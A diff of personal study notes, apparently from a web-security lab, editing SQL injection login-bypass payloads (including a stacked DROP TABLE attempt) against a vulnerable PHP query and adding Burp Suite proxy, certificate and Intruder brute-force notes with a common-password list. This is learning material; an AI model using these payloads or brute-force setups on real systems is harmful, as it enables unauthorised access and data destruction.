@@ -30,19 +30,19 @@ If we know the user name, we can fill in
 
 If we do not know the user name, we can fill in 
 
-- user: `x' or 1 = 1 limit 1 #`.
-- user: `x' or 1 = 1 limit 1 -- `.
+- user: `' or 1 = 1 limit 1 #`.
+- user: `' or 1 = 1 limit 1 -- `.
 
 ```
-    $query  = "SELECT * FROM `users` WHERE user = 'xxx' or 1 = 1 limit 1 #' AND password = '$pass';";
+    $query  = "SELECT * FROM `users` WHERE user = '' or 1 = 1 limit 1 #' AND password = '$pass';";
 ```
 
 We failed to do something like:
 
-- user: `xxx' or ''='';  DROP TABLE Persons; #`
+- user: `' or ''='';  DROP TABLE Persons; #`
 
 ```
-    $query  = "SELECT * FROM `users` WHERE user = 'xxx'; DROP TABLE Persons; #' AND password = '';";
+    $query  = "SELECT * FROM `users` WHERE user = ''; DROP TABLE Persons; #' AND password = '';";
 ```
 
 <https://www.php.net/manual/en/mysqli.quickstart.multiple-statement.php>
@@ -62,5 +62,28 @@ We failed to do something like:
     $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
 ```
 
-### Solution
+### Burp Suite 
 
+#### Proxy
+
+<https://portswigger.net/burp/documentation/desktop/tools/proxy/options>
+
+##### HTTPS
+
+<https://cloud.tencent.com/developer/news/288748>
+
+> 打开这个证书文件，根据提示安装这个证书，基本上是一路『下一步』，唯一需要注意的是，在『证书存储』这一步选择将证书存储在『受信任的根证书颁发机构』。
+
+##### localhost
+
+We can use ip address from `ipconfig` rather than `127.0.0.1` to let Burp Suite log the local requests.
+
+#### Intruder
+
+<https://portswigger.net/support/analyzing-burp-intruder-attack-results>
+
+##### Payloads
+
+<https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt>
+
+## High
